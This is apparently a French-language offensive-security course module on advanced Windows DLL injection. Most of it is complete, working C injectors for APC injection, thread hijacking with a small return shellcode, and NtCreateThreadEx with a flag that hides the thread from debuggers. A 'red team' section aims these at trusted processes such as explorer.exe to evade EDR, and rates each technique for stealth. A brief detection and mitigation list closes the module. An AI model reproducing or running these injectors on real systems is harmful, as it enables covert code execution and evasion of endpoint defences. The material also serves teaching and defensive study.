# Module W24 : DLL Injection Avancée

## Objectifs

À la fin de ce module, vous serez capable de :
- Comprendre les techniques avancées d'injection DLL (APC, Thread Hijacking)
- Implémenter l'injection via QueueUserAPC
- Maîtriser le détournement de thread (Thread Hijacking)
- Contourner les détections basiques via NtCreateThreadEx

## 1. Introduction aux techniques avancées

### 1.1 Pourquoi aller au-delà de CreateRemoteThread ?

**Analogie** : CreateRemoteThread est comme entrer par la porte principale avec une clé (évident pour les systèmes de surveillance). Les techniques avancées sont comme utiliser des passages secrets déjà existants.

**Problèmes de CreateRemoteThread** :
- Largement détecté par les EDR/AV
- Crée un nouveau thread (anomalie comportementale)
- Hook facilement détectable
- Nécessite des permissions élevées

**Solutions avancées** :
1. **APC Injection** : Utilise les threads existants
2. **Thread Hijacking** : Détourne un thread légitime
3. **NtCreateThreadEx** : API native moins surveillée

### 1.2 Schéma comparatif

```
INJECTION CLASSIQUE (CreateRemoteThread)
=========================================
Processus cible
┌─────────────────────────┐
│  Thread 1 (légitime)    │
│  Thread 2 (légitime)    │
│  Thread 3 (NOUVEAU!)    │◄── SUSPECT : nouveau thread créé
│    └─ LoadLibrary      │
└─────────────────────────┘

INJECTION APC (QueueUserAPC)
============================
Processus cible
┌─────────────────────────┐
│  Thread 1 (légitime)    │
│    APC Queue:           │
│    ├─ [APC système]     │
│    └─ [LoadLibrary]     │◄── Moins suspect : utilise thread existant
│  Thread 2 (légitime)    │
└─────────────────────────┘

THREAD HIJACKING
================
Processus cible
┌─────────────────────────┐
│  Thread 1 (suspendu)    │
│    RIP: 0x12345 ───┐    │
│    Modifié ────────┼───► LoadLibrary
│    puis restauré   │    │
└────────────────────┼────┘
                     │
                Exécution temporaire
```

## 2. APC Injection (Asynchronous Procedure Call)

### 2.1 Concept des APC

**Qu'est-ce qu'un APC ?**

Un APC est une fonction qui s'exécute dans le contexte d'un thread particulier. Windows utilise les APC pour :
- Les I/O asynchrones
- Les timers
- Les opérations kernel

**Deux types d'APC** :
- **Kernel-mode APC** : Priorité haute, non interruptible
- **User-mode APC** : Priorité basse, exécuté lors d'un état "alertable"

**États alertables** (quand un APC peut s'exécuter) :
- `SleepEx()`
- `WaitForSingleObjectEx()`
- `WaitForMultipleObjectsEx()`
- `SignalObjectAndWait()`
- `MsgWaitForMultipleObjectsEx()`

### 2.2 Schéma du flux APC

```
Attaquant                  Processus cible
   │                              │
   │  1. OpenProcess()            │
   ├─────────────────────────────►│
   │                              │
   │  2. VirtualAllocEx()         │
   │     (alloue mémoire)         │
   ├─────────────────────────────►│ [Mémoire DLL path]
   │                              │
   │  3. WriteProcessMemory()     │
   │     (écrit chemin DLL)       │
   ├─────────────────────────────►│ "C:\evil.dll"
   │                              │
   │  4. Énumère les threads      │
   │     CreateToolhelp32Snapshot │
   ├─────────────────────────────►│
   │                              │
   │  5. Pour chaque thread:      │
   │     QueueUserAPC(LoadLibrary)│
   ├─────────────────────────────►│ Thread 1 APC Queue
   ├─────────────────────────────►│ Thread 2 APC Queue
   ├─────────────────────────────►│ Thread 3 APC Queue
   │                              │
   │                              │ Thread entre en état alertable
   │                              │ (ex: SleepEx)
   │                              │    │
   │                              │    ├─► Exécute APC
   │                              │    └─► LoadLibrary("C:\evil.dll")
   │                              │
   │                         DLL chargée ✓
```

### 2.3 Implémentation APC Injection

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Énumère tous les threads d'un processus cible
BOOL EnumerateThreads(DWORD dwTargetPid, LPVOID lpParameter) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Erreur CreateToolhelp32Snapshot: %d\n", GetLastError());
        return FALSE;
    }

    THREADENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        printf("[-] Erreur Thread32First: %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    printf("[*] Énumération des threads du processus %d\n", dwTargetPid);

    do {
        // Vérifie si le thread appartient au processus cible
        if (te32.th32OwnerProcessID == dwTargetPid) {
            printf("[+] Thread trouvé: TID=%d\n", te32.th32ThreadID);

            // Ouvre le thread avec les droits nécessaires
            HANDLE hThread = OpenThread(
                THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT,
                FALSE,
                te32.th32ThreadID
            );

            if (hThread == NULL) {
                printf("[-] Impossible d'ouvrir le thread %d: %d\n",
                       te32.th32ThreadID, GetLastError());
                continue;
            }

            // File l'APC dans la queue du thread
            // lpParameter contient l'adresse du chemin DLL dans le processus cible
            if (QueueUserAPC(
                (PAPCFUNC)LoadLibraryA,  // Fonction à exécuter
                hThread,                  // Thread cible
                (ULONG_PTR)lpParameter    // Paramètre = chemin DLL
            )) {
                printf("[+] APC ajouté au thread %d\n", te32.th32ThreadID);
            } else {
                printf("[-] Échec QueueUserAPC pour thread %d: %d\n",
                       te32.th32ThreadID, GetLastError());
            }

            CloseHandle(hThread);
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    return TRUE;
}

// Fonction principale d'injection APC
BOOL InjectDllViaAPC(DWORD dwTargetPid, const char* szDllPath) {
    printf("[*] Démarrage APC Injection\n");
    printf("[*] PID cible: %d\n", dwTargetPid);
    printf("[*] DLL: %s\n", szDllPath);

    // 1. Ouvre le processus cible
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        dwTargetPid
    );

    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Alloue de la mémoire dans le processus cible
    SIZE_T dwSize = strlen(szDllPath) + 1;
    LPVOID lpRemoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        dwSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (lpRemoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Mémoire allouée à l'adresse: 0x%p\n", lpRemoteBuffer);

    // 3. Écrit le chemin de la DLL dans la mémoire allouée
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(
        hProcess,
        lpRemoteBuffer,
        szDllPath,
        dwSize,
        &bytesWritten
    )) {
        printf("[-] Erreur WriteProcessMemory: %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Chemin DLL écrit: %zu octets\n", bytesWritten);

    // 4. File l'APC dans tous les threads du processus
    if (!EnumerateThreads(dwTargetPid, lpRemoteBuffer)) {
        printf("[-] Erreur lors de l'énumération des threads\n");
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] APC Injection terminée avec succès\n");
    printf("[!] La DLL sera chargée lorsqu'un thread entrera en état alertable\n");

    // Note: On ne libère pas la mémoire car elle doit rester accessible
    // jusqu'à ce que les APC soient exécutés
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <chemin_dll>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    if (!InjectDllViaAPC(pid, dllPath)) {
        printf("[-] Injection échouée\n");
        return 1;
    }

    return 0;
}
```

### 2.4 Limitations de l'APC Injection

**Problèmes** :
1. **État alertable requis** : Le thread doit appeler une fonction alertable
2. **Timing incertain** : Exécution non garantie immédiatement
3. **Processus inactifs** : Peut ne jamais s'exécuter si le processus est idle

**Solution** : Forcer l'état alertable avec NtTestAlert (technique avancée)

## 3. Thread Hijacking

### 3.1 Concept du détournement de thread

**Principe** : Au lieu de créer un nouveau thread, on "détourne" temporairement un thread existant.

**Étapes** :
1. Suspendre un thread cible
2. Obtenir son contexte (registres CPU)
3. Modifier RIP/EIP pour pointer vers notre code
4. Sauvegarder l'ancien RIP
5. Reprendre le thread
6. Restaurer le contexte original après exécution

### 3.2 Schéma du flux Thread Hijacking

```
État initial du thread
┌─────────────────────────┐
│ Thread actif            │
│ RIP: 0x7FF800001234     │───► Exécution normale
│ RSP: 0x00000012FFE0     │
│ RCX, RDX, R8, R9...     │
└─────────────────────────┘

Étape 1: Suspension
┌─────────────────────────┐
│ Thread SUSPENDU         │
│ RIP: 0x7FF800001234     │───► Figé
│ Context sauvegardé      │
└─────────────────────────┘
         │
         ├─ SuspendThread()
         │
Étape 2: Modification du contexte
┌─────────────────────────┐
│ RIP: LoadLibraryA ◄─────┼── Modifié pour pointer vers LoadLibrary
│ RCX: "C:\evil.dll" ◄────┼── Paramètre 1 (chemin DLL)
│ RSP: shellcode_addr ◄───┼── Adresse de retour vers shellcode
└─────────────────────────┘
         │
         ├─ SetThreadContext()
         │
Étape 3: Reprise
┌─────────────────────────┐
│ Thread ACTIF            │
│ ├─► LoadLibrary(...) ───┼── Exécution détournée
│ ├─► DLL chargée         │
│ └─► Retour au shellcode │
│       │                 │
│       └─ Restaure RIP   │
│           original      │
└─────────────────────────┘
         │
         ├─ ResumeThread()
         │
Étape 4: Restauration
┌─────────────────────────┐
│ Thread normal           │
│ RIP: 0x7FF800001234     │───► Exécution normale reprend
│ (état original)         │
└─────────────────────────┘
```

### 3.3 Implémentation Thread Hijacking

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode pour restaurer le contexte original et reprendre l'exécution
// Ce shellcode sera exécuté après LoadLibrary pour restaurer RIP
unsigned char g_RestoreShellcode[] = {
    // push rax          ; Sauvegarde RAX
    0x50,
    // mov rax, 0x1122334455667788  ; Adresse originale (sera patché)
    0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11,
    // xchg rax, [rsp]   ; Place l'adresse originale sur la pile et récupère RAX
    0x48, 0x87, 0x04, 0x24,
    // ret               ; Retour à l'adresse originale
    0xC3
};

// Trouve le premier thread du processus cible
DWORD GetFirstThreadId(DWORD dwTargetPid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    THREADENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(THREADENTRY32);

    DWORD dwThreadId = 0;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwTargetPid) {
                dwThreadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    return dwThreadId;
}

BOOL InjectDllViaThreadHijack(DWORD dwTargetPid, const char* szDllPath) {
    printf("[*] Démarrage Thread Hijacking\n");
    printf("[*] PID cible: %d\n", dwTargetPid);
    printf("[*] DLL: %s\n", szDllPath);

    // 1. Ouvre le processus cible
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        dwTargetPid
    );

    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 2. Trouve un thread à détourner
    DWORD dwThreadId = GetFirstThreadId(dwTargetPid);
    if (dwThreadId == 0) {
        printf("[-] Aucun thread trouvé\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread cible: %d\n", dwThreadId);

    // 3. Ouvre le thread
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE,
        dwThreadId
    );

    if (hThread == NULL) {
        printf("[-] Erreur OpenThread: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. Suspend le thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[-] Erreur SuspendThread: %d\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread suspendu\n");

    // 5. Récupère le contexte du thread
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[-] Erreur GetThreadContext: %d\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Contexte récupéré\n");
    printf("[*] RIP original: 0x%llx\n", ctx.Rip);

    // 6. Alloue mémoire pour le chemin DLL
    SIZE_T dllPathSize = strlen(szDllPath) + 1;
    LPVOID lpDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (lpDllPath == NULL) {
        printf("[-] Erreur VirtualAllocEx (DLL path): %d\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 7. Écrit le chemin DLL
    if (!WriteProcessMemory(hProcess, lpDllPath, szDllPath, dllPathSize, NULL)) {
        printf("[-] Erreur WriteProcessMemory (DLL path): %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpDllPath, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Chemin DLL écrit à: 0x%p\n", lpDllPath);

    // 8. Alloue mémoire pour le shellcode de restauration
    LPVOID lpShellcode = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(g_RestoreShellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (lpShellcode == NULL) {
        printf("[-] Erreur VirtualAllocEx (shellcode): %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpDllPath, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 9. Patche le shellcode avec l'adresse RIP originale
    *(DWORD64*)(&g_RestoreShellcode[3]) = ctx.Rip;

    // 10. Écrit le shellcode
    if (!WriteProcessMemory(hProcess, lpShellcode, g_RestoreShellcode,
                           sizeof(g_RestoreShellcode), NULL)) {
        printf("[-] Erreur WriteProcessMemory (shellcode): %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode écrit à: 0x%p\n", lpShellcode);

    // 11. Récupère l'adresse de LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

    printf("[+] LoadLibraryA à: 0x%p\n", pLoadLibrary);

    // 12. Modifie le contexte
    // Convention d'appel x64 : RCX = 1er paramètre
    ctx.Rcx = (DWORD64)lpDllPath;  // Paramètre pour LoadLibraryA
    ctx.Rip = (DWORD64)pLoadLibrary;  // Nouvelle adresse d'exécution

    // Place l'adresse du shellcode comme adresse de retour
    ctx.Rsp -= 8;  // Décale la pile
    DWORD64 returnAddr = (DWORD64)lpShellcode;
    if (!WriteProcessMemory(hProcess, (LPVOID)ctx.Rsp, &returnAddr, 8, NULL)) {
        printf("[-] Erreur WriteProcessMemory (return address): %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 13. Applique le nouveau contexte
    if (!SetThreadContext(hThread, &ctx)) {
        printf("[-] Erreur SetThreadContext: %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpDllPath, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Contexte modifié\n");
    printf("[*] Nouveau RIP: 0x%p (LoadLibraryA)\n", pLoadLibrary);
    printf("[*] RCX (param): 0x%p (chemin DLL)\n", lpDllPath);

    // 14. Reprend le thread
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[-] Erreur ResumeThread: %d\n", GetLastError());
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread repris\n");
    printf("[+] Thread Hijacking terminé avec succès\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <chemin_dll>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    if (!InjectDllViaThreadHijack(pid, dllPath)) {
        printf("[-] Injection échouée\n");
        return 1;
    }

    return 0;
}
```

## 4. NtCreateThreadEx - API Native

### 4.1 Pourquoi utiliser les API natives ?

**API Win32 vs API Native** :

```
Application malveillante
        │
        ├─► kernel32.dll!CreateRemoteThread  ◄── Hooké par EDR
        │         │
        │         └─► ntdll.dll!NtCreateThreadEx
        │                   │
        │                   └─► syscall vers kernel
        │
        └─► ntdll.dll!NtCreateThreadEx ◄── Moins surveillé
                    │
                    └─► syscall vers kernel
```

**Avantages de NtCreateThreadEx** :
- Moins surveillé que CreateRemoteThread
- Plus de contrôle sur les flags de création
- Peut créer des threads cachés (CREATE_SUSPENDED | HIDE_FROM_DEBUGGER)

### 4.2 Déclaration de NtCreateThreadEx

```c
#include <windows.h>
#include <stdio.h>

// Définition de la structure CLIENT_ID
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Prototype de NtCreateThreadEx (non documenté)
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE StartRoutine,
    IN LPVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN LPVOID AttributeList
);

// Flags pour CreateFlags
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED    0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH  0x00000002
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004

BOOL InjectDllViaNtCreateThreadEx(DWORD dwTargetPid, const char* szDllPath) {
    printf("[*] Démarrage NtCreateThreadEx Injection\n");

    // 1. Charge ntdll.dll et résout NtCreateThreadEx
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Erreur GetModuleHandle(ntdll): %d\n", GetLastError());
        return FALSE;
    }

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        hNtdll,
        "NtCreateThreadEx"
    );

    if (NtCreateThreadEx == NULL) {
        printf("[-] Erreur GetProcAddress(NtCreateThreadEx): %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] NtCreateThreadEx résolu à: 0x%p\n", NtCreateThreadEx);

    // 2. Ouvre le processus cible
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE,
        dwTargetPid
    );

    if (hProcess == NULL) {
        printf("[-] Erreur OpenProcess: %d\n", GetLastError());
        return FALSE;
    }

    // 3. Alloue mémoire pour le chemin DLL
    SIZE_T dwSize = strlen(szDllPath) + 1;
    LPVOID lpRemoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        dwSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (lpRemoteBuffer == NULL) {
        printf("[-] Erreur VirtualAllocEx: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Mémoire allouée à: 0x%p\n", lpRemoteBuffer);

    // 4. Écrit le chemin DLL
    if (!WriteProcessMemory(hProcess, lpRemoteBuffer, szDllPath, dwSize, NULL)) {
        printf("[-] Erreur WriteProcessMemory: %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 5. Récupère l'adresse de LoadLibraryA
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(
        hKernel32,
        "LoadLibraryA"
    );

    if (pLoadLibrary == NULL) {
        printf("[-] Erreur GetProcAddress(LoadLibraryA): %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] LoadLibraryA à: 0x%p\n", pLoadLibrary);

    // 6. Crée le thread distant via NtCreateThreadEx
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,                           // ThreadHandle
        THREAD_ALL_ACCESS,                  // DesiredAccess
        NULL,                               // ObjectAttributes
        hProcess,                           // ProcessHandle
        pLoadLibrary,                       // StartRoutine
        lpRemoteBuffer,                     // Argument
        THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,  // CreateFlags
        0,                                  // ZeroBits
        0,                                  // StackSize
        0,                                  // MaximumStackSize
        NULL                                // AttributeList
    );

    if (status != 0 || hThread == NULL) {
        printf("[-] Erreur NtCreateThreadEx: 0x%08X\n", status);
        VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread distant créé: 0x%p\n", hThread);

    // 7. Attend la fin du chargement
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread terminé\n");

    // 8. Nettoyage
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, lpRemoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Injection terminée avec succès\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <PID> <chemin_dll>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    if (!InjectDllViaNtCreateThreadEx(pid, dllPath)) {
        printf("[-] Injection échouée\n");
        return 1;
    }

    return 0;
}
```

## 5. Applications Offensives

### 5.1 Cas d'usage Red Team

**Scénario 1 : Contourner EDR avec APC**
- Cible : Processus légitime avec EDR (ex: explorer.exe)
- Technique : APC Injection
- Avantage : Pas de nouveau thread créé
- OPSEC : Attendre une opération I/O naturelle

**Scénario 2 : Injection furtive avec Thread Hijacking**
- Cible : Processus système de confiance
- Technique : Thread Hijacking
- Avantage : Réutilise un thread existant
- OPSEC : Restauration complète du contexte

**Scénario 3 : Bypass de détection avec NtCreateThreadEx**
- Cible : Environnement avec hooks sur CreateRemoteThread
- Technique : NtCreateThreadEx direct
- Avantage : Contourne les hooks userland
- OPSEC : Flag HIDE_FROM_DEBUGGER

### 5.2 Comparaison OPSEC

```
Technique            │ Stealth │ Fiabilité │ Détection EDR │ Complexité
─────────────────────┼─────────┼───────────┼───────────────┼────────────
CreateRemoteThread   │    ★    │   ★★★★★   │     Élevée    │     ★
APC Injection        │   ★★★   │    ★★★    │    Moyenne    │    ★★
Thread Hijacking     │  ★★★★   │    ★★     │     Faible    │   ★★★★
NtCreateThreadEx     │   ★★★   │   ★★★★    │    Moyenne    │    ★★
```

### 5.3 Détection et Mitigations

**Indicateurs de compromission (IOC)** :

1. **APC Injection** :
   - Multiple APCs dans la queue d'un thread
   - APCs pointant vers des adresses suspectes
   - Détection : Monitor `NtQueueApcThread`

2. **Thread Hijacking** :
   - Suspension/reprise rapide de thread
   - Modification du contexte (RIP/EIP)
   - Détection : Monitor `SetThreadContext`

3. **NtCreateThreadEx** :
   - Appels directs à ntdll (bypass kernel32)
   - Threads avec flags inhabituels
   - Détection : Kernel callbacks, ETW

**Contre-mesures** :
- EDR avec monitoring syscall
- Sandboxing au niveau kernel
- CFG (Control Flow Guard)
- CIG (Code Integrity Guard)

## 6. Checklist de maîtrise

- [ ] Je comprends la différence entre CreateRemoteThread et les techniques avancées
- [ ] Je peux expliquer le concept d'APC et les états alertables
- [ ] Je sais implémenter une APC Injection complète
- [ ] Je comprends le mécanisme de Thread Hijacking
- [ ] Je peux modifier et restaurer le contexte d'un thread
- [ ] Je connais les avantages de NtCreateThreadEx
- [ ] Je sais résoudre dynamiquement les API natives
- [ ] Je comprends les trade-offs OPSEC de chaque technique
- [ ] Je connais les méthodes de détection de ces techniques

## Exercices

Voir [exercice.md](exercice.md) pour :
1. Implémenter une APC Injection avec retry automatique
2. Créer un Thread Hijacker avec détection de thread optimal
3. Développer un injecteur hybride (APC + Thread Hijacking)
4. Bypass d'un EDR simulé avec NtCreateThreadEx

---

**Navigation**
- [Module précédent : W23 DLL Injection Basics](../W23_dll_injection_basics/)
- [Module suivant : W25 Process Hollowing](../W25_process_hollowing/)
